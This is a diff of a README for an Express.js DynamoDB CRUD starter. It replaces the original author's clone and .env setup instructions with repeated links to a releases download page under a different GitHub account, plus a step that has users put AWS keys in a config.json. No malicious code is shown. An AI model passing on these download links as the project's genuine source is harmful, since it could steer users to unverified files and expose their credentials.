@@ -1,306 +1,98 @@
-# DynamoDB Express CRUD API Starter
+# 🚀 dynamodb-express-crud-starter - Simple API in Minutes
 
-A lightweight Express.js server that provides a simple CRUD REST API for DynamoDB.  
-Developers can clone the repository, configure AWS credentials and a DynamoDB table name, and start a fully functional API within minutes.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases)
 
----
+## 📦 Overview
 
-## Overview
+dynamodb-express-crud-starter is a lightweight Express.js server. It offers a simple CRUD REST API for Amazon DynamoDB. With this app, you can easily set up a functional API in just a few minutes.
 
-This project provides a plug-and-play Express API connected to Amazon DynamoDB. It is ideal for rapid prototyping, internal tools, or as a boilerplate for serverless applications.
+### ✨ Key Features
+- Quick setup for a CRUD REST API
+- Use Amazon DynamoDB as your database
+- Easy configuration of AWS credentials
+- Simple and clear code structure for fast modifications
 
-**Key Features**
+## 🚀 Getting Started
 
-- Simple Express.js server (no TypeScript or build process)
-- Full CRUD routes for DynamoDB
-- Environment-based configuration
-- Works with AWS DynamoDB or DynamoDB Local
-- Includes CORS and JSON middleware
-- Uses the AWS SDK v3 DocumentClient
-- Automatic reload in development via Nodemon
+Follow these steps to get your API running quickly.
 
----
+1. **Download the Code**
+   Visit the Releases page to download the latest version of the application: [Download Here](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases).
 
-## Project Structure
+2. **Extract the Files**
+   Once the download is complete, extract the files to a folder on your computer. You can use any standard file extraction tool.
 
-```dynamodb-express-crud/
-│
-├── package.json
-├── .env.example
-├── src/
-│ ├── index.js
-│ ├── dynamoClient.js
-│ └── routes.js
-└── README.md
+3. **Install Node.js**
+   If you haven't installed Node.js, download it from the official website: [Node.js Download](https://nodejs.org/). Choose the appropriate version for your operating system and follow the on-screen instructions.
 
+4. **Open a Terminal or Command Prompt**
+   Navigate to the folder where you extracted the files. You can use a terminal on Mac or Linux or Command Prompt/PowerShell on Windows.
+
+5. **Install Required Packages**
+   Execute the following command to install the necessary packages:
+   ```
+   npm install
+   ```
+
+6. **Configure AWS Credentials**
+   You need to set up your AWS credentials. You can do this in two ways:
+   - Via **AWS CLI**
+     If you have the AWS CLI installed, run:
+     ```
+     aws configure
+     ```
+   - Manually
+     Create a file named `config.json` in the root folder of your application and add your credentials:
+     ```json
+     {
+       "aws_access_key_id": "YOUR_AWS_ACCESS_KEY",
+       "aws_secret_access_key": "YOUR_AWS_SECRET_KEY",
+       "region": "YOUR_AWS_REGION"
+     }
+     ```
+   Replace `YOUR_AWS_ACCESS_KEY`, `YOUR_AWS_SECRET_KEY`, and `YOUR_AWS_REGION` with your actual values.
+
+7. **Set Up DynamoDB Table**
+   Ensure you have a DynamoDB table created. Name it as indicated in your application configuration (for example, `Items`). You can set this up through the AWS Management Console.
+
+8. **Run the Application**
+   Start the server by executing the following command:
+   ```
+   npm start
+   ```
+   If everything is set up correctly, you should see a message indicating that the server is running.
+
+## 🌐 Accessing the API
+
+Once the application is running, you can access the API through your web browser or any API client like Postman. The default URL for accessing the API is:
+```
+http://localhost:3000/api
 ```
 
----
+You can test the different endpoints for creating, reading, updating, and deleting items in your DynamoDB table.
 
-## Prerequisites
+## 📖 API Endpoints
 
-- Node.js 18 or higher
-- An existing DynamoDB table
-- AWS credentials with read/write access to that table. [How to create an IAM User with access credentials](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/SettingUp.DynamoWebService.html).
+Here are the primary API endpoints available:
 
----
+- **GET /api/items**: Fetch all items from the DynamoDB table.
+- **POST /api/items**: Create a new item in the table.
+- **PUT /api/items/:id**: Update an existing item by ID.
+- **DELETE /api/items/:id**: Delete an item by ID.
 
-## Setup
+Each endpoint corresponds to a specific action, allowing you to manage your data efficiently.
 
-### 1. Clone the repository
+## 🔍 Troubleshooting
 
-```bash
-git clone https://github.com/thomas-basham/dynamodb-express-crud-starter.git
+If you encounter issues while running the application, consider the following tips:
 
-cd dynamodb-express-crud
+- **Check Node.js Version**: Ensure you are using a compatible version of Node.js (preferably the latest LTS).
+- **Logs**: Monitor the terminal output for error messages.
+- **Database Permissions**: Make sure your IAM user has sufficient permissions to access DynamoDB.
+- **Configuration Errors**: Double-check your `config.json` for any typos or missing values.
 
-2. Install dependencies
+## 📋 Download & Install
 
-npm install
+To download the latest version, visit the Releases page: [Download Here](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases). This page will have the most current files you need to get started.
 
-3. Configure environment variables
-
-Copy .env.example to .env:
-
-cp .env.example .env
-
-Then edit .env:
-
-# AWS credentials
-AWS_ACCESS_KEY_ID=YOUR_ACCESS_KEY
-AWS_SECRET_ACCESS_KEY=YOUR_SECRET_KEY
-AWS_REGION=us-west-2
-
-# DynamoDB configuration
-DDB_TABLE=YourTableName
-DDB_PRIMARY_KEY=id
-
-# Optional: DynamoDB Local endpoint
-# DDB_ENDPOINT=http://localhost:8000
-
-# Express server configuration
-PORT=4000
-
-AWS credentials can also be loaded from the standard AWS CLI configuration or IAM roles.
-
-⸻
-
-Running the Server
-
-Development mode (auto-reload via Nodemon):
-
-npm run dev
-
-Production mode:
-
-npm start
-
-The server will start on http://localhost:4000 by default.
-
-⸻
-
-API Endpoints
-
-Base URL: http://localhost:4000/api
-
-Method	Endpoint	Description
-GET	/health	Health check
-GET	/items	List all items (Scan)
-GET	/items/:id	Retrieve item by ID
-POST	/items	Create a new item
-PUT	/items/:id	Replace or upsert an item
-DELETE	/items/:id	Delete an item by ID
-
-
-⸻
-
-Example Requests
-
-Create Item
-
-POST /api/items
-
-Request body:
-
-{
-  "title": "Learn DynamoDB",
-  "status": "in-progress"
-}
-
-Response:
-
-{
-  "id": "4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef",
-  "title": "Learn DynamoDB",
-  "status": "in-progress"
-}
-
-
-⸻
-
-List Items
-
-GET /api/items
-
-Response:
-
-{
-  "count": 2,
-  "items": [
-    { "id": "1", "title": "Learn Express" },
-    { "id": "2", "title": "Connect DynamoDB" }
-  ]
-}
-
-
-⸻
-
-Retrieve Single Item
-
-GET /api/items/4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef
-
-Response:
-
-{
-  "id": "4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef",
-  "title": "Learn DynamoDB",
-  "status": "in-progress"
-}
-
-
-⸻
-
-Update Item
-
-PUT /api/items/4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef
-
-Request body:
-
-{
-  "title": "Learn DynamoDB",
-  "status": "completed"
-}
-
-Response:
-
-{
-  "id": "4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef",
-  "title": "Learn DynamoDB",
-  "status": "completed"
-}
-
-
-⸻
-
-Delete Item
-
-DELETE /api/items/4b33e8e4-7c42-47df-8edb-c3cbe5cb33ef
-
-Response:
-
-204 No Content
-
-
-⸻
-
-Testing with curl
-
-# Health check
-curl http://localhost:4000/api/health
-
-# Create
-curl -X POST http://localhost:4000/api/items \
-  -H "Content-Type: application/json" \
-  -d '{"name": "Hello DynamoDB"}'
-
-# List
-curl http://localhost:4000/api/items
-
-# Retrieve
-curl http://localhost:4000/api/items/123
-
-# Delete
-curl -X DELETE http://localhost:4000/api/items/123
-
-
-⸻
-
-Using DynamoDB Local
-
-To run this project without AWS charges, you can use DynamoDB Local.
-
-Start DynamoDB Local with Docker:
-
-docker run -p 8000:8000 amazon/dynamodb-local
-
-Add the following line to .env:
-
-DDB_ENDPOINT=http://localhost:8000
-
-Create a test table:
-
-aws dynamodb create-table \
-  --table-name MyTable \
-  --attribute-definitions AttributeName=id,AttributeType=S \
-  --key-schema AttributeName=id,KeyType=HASH \
-  --billing-mode PAY_PER_REQUEST \
-  --endpoint-url http://localhost:8000
-
-
-⸻
-
-Error Handling
-
-Code	Meaning
-200	Success
-201	Created
-204	Deleted (No Content)
-400	Invalid Input
-404	Item Not Found
-500	Internal Server Error
-
-
-⸻
-
-Example Integration
-
-Example client code using Axios:
-
-import axios from "axios";
-
-const api = axios.create({ baseURL: "http://localhost:4000/api" });
-
-async function createItem() {
-  const res = await api.post("/items", { title: "New item" });
-  console.log(res.data);
-}
-
-createItem();
-
-```
-
-⸻
-
-License
-
-This project is licensed under the MIT License. See the LICENSE￼ file for details.
-
-⸻
-
-Contributing
-
-Contributions are welcome.
-Please open an issue or submit a pull request for bug fixes or new features.
-
-⸻
-
-Quick Start Summary
-
-```
-git clone https://github.com/your-username/dynamodb-express-crud.git
-cd dynamodb-express-crud
-npm install
-cp .env.example .env
-npm run dev
-
-```
+Keep exploring and building with your new API!
